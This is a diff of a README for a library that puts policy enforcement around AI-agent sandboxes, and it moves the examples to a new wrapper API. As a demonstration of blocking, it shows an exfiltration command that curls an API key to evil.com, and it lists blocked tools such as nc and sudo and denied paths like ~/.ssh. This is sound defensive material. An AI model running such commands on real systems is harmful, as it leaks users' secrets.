@@ -7,9 +7,12 @@ npm install @agentsh/secure-sandbox
 ```
 
 ```typescript
-import { createSandbox } from '@agentsh/secure-sandbox';
+import { Sandbox } from '@vercel/sandbox';
+import { secureSandbox } from '@agentsh/secure-sandbox';
+import { vercel } from '@agentsh/secure-sandbox/adapters/vercel';
 
-const sandbox = await createSandbox();
+const raw = await Sandbox.create({ runtime: 'node24' });
+const sandbox = await secureSandbox(vercel(raw));
 
 // Every command is now mediated by agentsh policy enforcement
 const result = await sandbox.exec('echo hello');
@@ -22,7 +25,7 @@ await sandbox.exec('curl https://evil.com/collect?key=$API_KEY');
 // ✗ blocked — domain not in allowlist
 ```
 
-Three lines. Your sandbox is secured.
+One line added. Your sandbox is secured.
 
 ## The Problem
 
@@ -53,7 +56,7 @@ Your sandbox provider gives you **isolation**. `@agentsh/secure-sandbox` gives y
 ┌─────────────────────────────────────────────────────────┐
 │  Your Application                                       │
 │                                                         │
-│   const sandbox = await createSandbox();                │
+│   const sandbox = await secureSandbox(vercel(raw));   │
 │   await sandbox.exec('npm install');  ──────────┐       │
 │                                                 │       │
 └─────────────────────────────────────────────────│───────┘
@@ -94,36 +97,36 @@ Enforcement happens at the **syscall level** — seccomp intercepts process exec
 
 ## Supported Platforms
 
-### Vercel Sandbox
+| Provider | seccomp | Landlock | FUSE | Network Proxy | DLP | Security Mode |
+|----------|---------|----------|------|---------------|-----|---------------|
+| **Vercel** | ✅ | ✅ | ❌ (blocked by Firecracker) | ✅ | ✅ | `landlock` |
+| **E2B** | ✅ | ✅ | ✅ | ✅ | ✅ | `full` |
+| **Daytona** | ✅ | ✅ | ✅ | ✅ | ✅ | `full` |
+| **Cloudflare** | ✅ | ✅ | ❌ (blocked by Firecracker) | ✅ | ✅ | `landlock` |
+| **Blaxel** | ✅ | ✅ | ✅ | ✅ | ✅ | `full` |
 
-```typescript
-import { createSandbox } from '@agentsh/secure-sandbox';
-
-// One function — creates and secures a Vercel Sandbox
-const sandbox = await createSandbox({
-  runtime: 'node24',
-  timeout: 600_000,
-});
-
-const result = await sandbox.exec('node -e "console.log(1+1)"');
-console.log(result.stdout); // "2"
-
-await sandbox.stop();
-```
+| Capability | What It Does |
+|------------|-------------|
+| **seccomp** | Intercepts process execution at the syscall level — blocks `sudo`, `env`, `nc` before they run |
+| **Landlock** | Kernel-level filesystem restrictions — denies access to paths like `~/.ssh`, `~/.aws` |
+| **FUSE** | Virtual filesystem layer — intercepts every file open/read/write, enables soft-delete quarantine |
+| **Network Proxy** | Filters outbound connections by domain and port — blocks exfiltration to unauthorized hosts |
+| **DLP** | Detects and redacts secrets (API keys, tokens) in command output |
 
 ### Vercel AI SDK
 
 ```typescript
 import { Sandbox } from '@vercel/sandbox';
-import { createSandbox } from '@agentsh/secure-sandbox';
+import { secureSandbox } from '@agentsh/secure-sandbox';
+import { vercel } from '@agentsh/secure-sandbox/adapters/vercel';
 import { generateText, tool } from 'ai';
 import { z } from 'zod';
 
-// Before — no protection:
-// const sandbox = await Sandbox.create({ runtime: 'node24' });
+// Create your sandbox as usual
+const raw = await Sandbox.create({ runtime: 'node24' });
 
-// After — one-line replacement:
-const sandbox = await createSandbox({ runtime: 'node24' });
+// Wrap it with secureSandbox — one line to add protection
+const sandbox = await secureSandbox(vercel(raw));
 
 const { text } = await generateText({
   model: anthropic('claude-sonnet-4-5-20250514'),
@@ -133,7 +136,7 @@ const { text } = await generateText({
       parameters: z.object({ command: z.string() }),
       execute: async ({ command }) => {
         // Before — unprotected:
-        // const result = await sandbox.runCommand({ cmd: 'bash', args: ['-c', command] });
+        // const result = await raw.runCommand({ cmd: 'bash', args: ['-c', command] });
 
         // After — every command is mediated by agentsh policy:
         return sandbox.exec(command);
@@ -147,7 +150,7 @@ const { text } = await generateText({
 await sandbox.stop();
 ```
 
-`createSandbox()` is a drop-in replacement for `Sandbox.create()`. Same sandbox, same Firecracker VM — but now every command the agent runs goes through the policy engine. The agent can `npm install` and write code, but it can't read your `.env`, `curl` secrets out, or `sudo` its way to root.
+`secureSandbox(vercel(raw))` wraps your existing Vercel Sandbox. Same sandbox, same Firecracker VM — but now every command the agent runs goes through the policy engine. The agent can `npm install` and write code, but it can't read your `.env`, `curl` secrets out, or `sudo` its way to root.
 
 ### E2B
 
@@ -285,7 +288,7 @@ const policy = agentDefault({
   file: [{ allow: '/data/**', ops: ['read'] }],
 });
 
-const sandbox = await createSandbox({ policy });
+const sandbox = await secureSandbox(vercel(raw), { policy });
 ```
 
 ### Overriding Base Rules
@@ -311,7 +314,7 @@ The security level depends on what the sandbox kernel supports:
 | `minimal` | Policy evaluation only, no kernel enforcement | Containers without seccomp |
 
 ```typescript
-const sandbox = await createSandbox({
+const sandbox = await secureSandbox(vercel(raw), {
   minimumSecurityMode: 'landlock', // Fail if kernel can't enforce this level
 });
 
@@ -319,20 +322,6 @@ console.log(sandbox.securityMode); // 'landlock'
 ```
 
 ## API Reference
-
-### `createSandbox(config?)`
-
-Creates and secures a Vercel Sandbox in one call.
-
-```typescript
-const sandbox = await createSandbox({
-  policy: agentDefault(),     // Security policy (default: agentDefault)
-  runtime: 'node24',          // 'node22' | 'node24' | 'python3.13'
-  timeout: 600_000,           // Sandbox lifetime in ms
-  workspace: '/workspace',    // Working directory
-  minimumSecurityMode: 'landlock',
-});
-```
 
 ### `secureSandbox(adapter, config?)`
 
